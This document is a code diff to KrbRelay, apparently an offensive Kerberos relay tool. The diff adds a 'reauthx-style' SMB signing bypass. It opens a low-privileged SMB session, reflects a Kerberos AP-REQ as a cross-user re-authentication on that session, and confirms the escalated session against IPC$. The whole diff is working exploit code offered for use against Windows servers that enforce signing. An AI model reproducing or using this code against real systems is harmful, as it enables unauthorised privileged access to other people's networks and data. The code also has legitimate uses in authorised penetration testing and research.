@@ -1,5 +1,6 @@
-﻿using KrbRelay.Clients.Attacks.Smb;
+using KrbRelay.Clients.Attacks.Smb;
 //using KrbRelay.Com;
+using SMBLibrary;
 using SMBLibrary.Client;
 using SMBLibrary.Services;
 using System;
@@ -34,6 +35,55 @@ namespace KrbRelay.Clients
         {
 
         }
+        /// <summary>
+        /// reauthx-style bypass for targets that enforce SMB signing.
+        /// Opens a base session as a low privileged account (so we know its signing key), then sends the reflected
+        /// AP-REQ as a cross-user re-authentication on that same session. The vulnerable server keeps signing with
+        /// the low privileged key, so the now privileged session remains usable even though signing is enforced.
+        /// </summary>
+        private bool reauthConnect(SMB2Client smbc, byte[] apreqBuffer)
+        {
+            Console.WriteLine("[*] reauth: opening base SMB session as {0}\\{1}", Program.reauthDomain, Program.reauthUser);
+
+            NTStatus baseStatus = smbc.Login(Program.reauthDomain, Program.reauthUser, Program.reauthPassword);
+            if (baseStatus != NTStatus.STATUS_SUCCESS)
+            {
+                Console.WriteLine("[-] reauth: base NTLM session as {0}\\{1} failed: {2}", Program.reauthDomain, Program.reauthUser, baseStatus);
+                return false;
+            }
+            Console.WriteLine("[+] reauth: base session established, low privileged signing key derived");
+
+            NTStatus reauthStatus = smbc.ReauthWithTicket(apreqBuffer);
+            Console.WriteLine("[*] reauth: reflected cross-user re-authentication status: {0} (0x{1:X8})", reauthStatus, (uint)reauthStatus);
+            if (reauthStatus != NTStatus.STATUS_SUCCESS)
+            {
+                Console.WriteLine("[-] reauth: target refused the re-authentication - likely patched (same-user re-auth check) or signing key re-derived");
+                Console.WriteLine("[-] reauth: falling back is not possible for a signing-enforced target, no attacks will run");
+                return false;
+            }
+
+            // Verify that the kept (low privileged) signing key is still accepted by the privileged session.
+            try
+            {
+                ISMBFileStore ipc = smbc.TreeConnect("IPC$", out NTStatus treeStatus);
+                if (ipc != null)
+                {
+                    ipc.Disconnect();
+                    Console.WriteLine("[+] reauth: privileged session verified against IPC$ (signing with the low privileged key)");
+                }
+                else
+                {
+                    Console.WriteLine("[!] reauth: re-auth succeeded but the session could not be verified (TreeConnect IPC$: {0})", treeStatus);
+                }
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine("[!] reauth: session verification failed: {0}", e.Message);
+            }
+
+            return true;
+        }
+
         public void smbConnect(SMB2Client smbc, byte[] apreqBuffer)
         {
          
@@ -63,8 +113,15 @@ namespace KrbRelay.Clients
             byte[] response=null;
             if (!alreadyLoggedIn)
             {
-                response = smbc.Login(ticket, out success);
-                Console.WriteLine("[*] Login success: {0}", success);
+                if (Program.reauth)
+                {
+                    success = reauthConnect(smbc, apreqBuffer);
+                }
+                else
+                {
+                    response = smbc.Login(ticket, out success);
+                    Console.WriteLine("[*] Login success: {0}", success);
+                }
             }
             if (!success)
             {
